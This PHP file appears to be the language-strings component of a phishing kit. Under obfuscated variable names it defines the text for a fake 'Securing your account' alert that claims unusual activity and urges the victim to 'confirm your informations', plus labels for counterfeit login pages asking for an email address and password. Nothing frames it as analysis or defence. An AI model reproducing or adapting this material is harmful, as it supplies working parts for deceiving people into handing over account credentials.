<?php
	//SECURE PAGE
	$xys0x = "Securing your account";
	$xys1x = "We noticed some unusual activity";
	$xys2x = "We need your help securing your account to prevent unauthorized access. For your safety, click Secure My Account to confirm your informations.";
	$xys3x = "Secure My Account";
	$xys4x = "Processing...";
	$xys5x = "Contact Us";
	$xys6x = "Privacy";
	$xys7x = "Legal";
	$xys8x = "Worldwide";
	
	//OLD LOGIN PAGE
	$xys9x = "Log in to your account";
	$xys10x = "Some of your info isn't correct. Please try again.";
	$xys11x = "Email address";
	$xys12x = "Enter your email address.";
	$xys13x = "Password";
	$xys14x = "Show";
	$xys15x = "Hide";
	$xys16x = "Enter your password.";
	$xys17x = "Log In";
	$xys18x = "Having trouble logging in?";
	$xys19x = "or";
	$xys20x = "Sign Up";

	//NEW LOGIN PAGE
	$xys21x = "Change";
	$xys22x = "Remember Me";
	$xys23x = "What's this?";
	$xys24x = "By clicking this, you agree to let";
	$xys25x = "remember your first and last name, profile picture, and user ID when you log in on this browser. We do not recommend this for shared devices.";
	$xys26x = "Next";
	
?>